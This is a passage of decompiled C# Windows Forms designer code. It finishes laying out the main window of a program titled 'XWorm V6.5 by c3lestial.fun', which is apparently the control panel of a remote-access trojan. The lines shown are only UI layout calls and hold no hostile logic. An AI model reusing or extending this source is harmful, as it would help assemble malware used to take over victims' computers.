			base.Controls.Add(this.Guna2Panel1);
			base.Icon = (global::System.Drawing.Icon)componentResourceManager.GetObject("$this.Icon");
			base.Name = "Main";
			base.StartPosition = global::System.Windows.Forms.FormStartPosition.CenterScreen;
			this.Text = "XWorm V6.5 by c3lestial.fun";
			this.StatusStrip1.ResumeLayout(false);
			this.StatusStrip1.PerformLayout();
			this.Guna2ContextMenuStrip5.ResumeLayout(false);
			((global::System.ComponentModel.ISupportInitialize)this.performanceCounter2).EndInit();
			((global::System.ComponentModel.ISupportInitialize)this.performanceCounter1).EndInit();
			this.Guna2ContextMenuStrip4.ResumeLayout(false);
			this.Guna2Panel2.ResumeLayout(false);
			this.Guna2Panel6.ResumeLayout(false);
			this.Guna2ContextMenuStrip2.ResumeLayout(false);
			this.Guna2ContextMenuStrip1.ResumeLayout(false);
			this.Guna2ContextMenuStrip3.ResumeLayout(false);
			base.ResumeLayout(false);
			base.PerformLayout();
		}

		// Token: 0x0400011A RID: 282
		private global::System.ComponentModel.IContainer components;
	}
}
